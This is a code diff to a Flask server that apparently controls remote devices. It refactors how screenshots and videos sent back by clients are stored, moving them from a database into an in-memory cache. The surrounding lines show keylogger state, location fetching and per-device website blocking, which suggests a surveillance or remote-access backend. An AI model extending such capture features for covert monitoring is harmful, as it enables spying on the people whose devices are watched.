@@ -55,6 +55,20 @@ blocked_websites_col = db["blocked_websites"]  # Store blocked websites per devi
 # Global variables
 keylogger_running = False
 captured_text = ""
+latest_media_cache = {}
+latest_media_lock = threading.Lock()
+
+def _cache_latest_media(device_id, result):
+    media_type = result.get("type") or "screenshot"
+    payload = {
+        "image_base64": result.get("image_base64"),
+        "video_base64": result.get("video_base64"),
+        "mime_type": result.get("mime_type"),
+        "media_type": media_type,
+        "created_at": datetime.now().isoformat()
+    }
+    with latest_media_lock:
+        latest_media_cache.setdefault(device_id, {})[media_type] = payload
 
 # ==================== LOGIN SYSTEM ====================
 
@@ -1928,41 +1942,26 @@ def cmd_fetch_location():
 def receive_command_result(command_id):
     """Receive result from client"""
     data = request.json or {}
-    result = data.get('result', {})
+    raw_result = data.get('result', {})
 
     command_doc = commands_col.find_one({"_id": ObjectId(command_id)}) or {}
     device_id = command_doc.get("device_id")
 
+    result_for_store = raw_result
+    if isinstance(raw_result, dict) and (raw_result.get("image_base64") or raw_result.get("video_base64")):
+        _cache_latest_media(device_id, raw_result)
+        result_for_store = dict(raw_result)
+        result_for_store.pop("image_base64", None)
+        result_for_store.pop("video_base64", None)
+
     commands_col.update_one(
         {"_id": ObjectId(command_id)},
-        {"$set": {"result": result, "status": "completed", "result_received_at": datetime.now()}}
+        {"$set": {"result": result_for_store, "status": "completed", "result_received_at": datetime.now()}}
     )
 
     if device_id:
-        success = result.get("success", True) if isinstance(result, dict) else True
-        store_result(device_id, command_id, result, success=success)
-
-        if isinstance(result, dict):
-            media_type = result.get("type")
-            if result.get("image_base64"):
-                screenshots_col.insert_one({
-                    "device_id": device_id,
-                    "command_id": command_id,
-                    "media_type": media_type or "screenshot",
-                    "image_base64": result.get("image_base64"),
-                    "created_at": datetime.now()
-                })
-                print(f"[{datetime.now().isoformat()}] 📸 Stored {media_type or 'screenshot'} image for device {device_id}")
-            if result.get("video_base64"):
-                screenshots_col.insert_one({
-                    "device_id": device_id,
-                    "command_id": command_id,
-                    "media_type": media_type or "record",
-                    "video_base64": result.get("video_base64"),
-                    "mime_type": result.get("mime_type", "video/mp4"),
-                    "created_at": datetime.now()
-                })
-                print(f"[{datetime.now().isoformat()}] 🎬 Stored {media_type or 'record'} video for device {device_id}")
+        success = result_for_store.get("success", True) if isinstance(result_for_store, dict) else True
+        store_result(device_id, command_id, result_for_store, success=success)
 
     print(f"[{datetime.now().isoformat()}] ✅ Command result received for {command_id} (device: {device_id})")
     return jsonify({"status": "success"})
@@ -2067,23 +2066,15 @@ def get_latest_media(device_id):
         return jsonify({"error": "Unauthorized: You don't have access to this device"}), 403
 
     media_type = request.args.get("type", "screenshot")
-    doc = screenshots_col.find_one(
-        {"device_id": device_id, "media_type": media_type},
-        sort=[("created_at", -1)]
-    )
+    with latest_media_lock:
+        doc = latest_media_cache.get(device_id, {}).get(media_type)
 
     if not doc:
         print(f"[{datetime.now().isoformat()}] ⚠️ No {media_type} found for device {device_id}")
         return jsonify({})
 
     print(f"[{datetime.now().isoformat()}] ✅ Returning {media_type} for device {device_id}")
-    return jsonify({
-        "image_base64": doc.get("image_base64"),
-        "video_base64": doc.get("video_base64"),
-        "mime_type": doc.get("mime_type"),
-        "media_type": doc.get("media_type"),
-        "created_at": str(doc.get("created_at", ""))
-    })
+    return jsonify(doc)
 
 @app.route('/api/results/<device_id>', methods=['GET'])
 @login_required
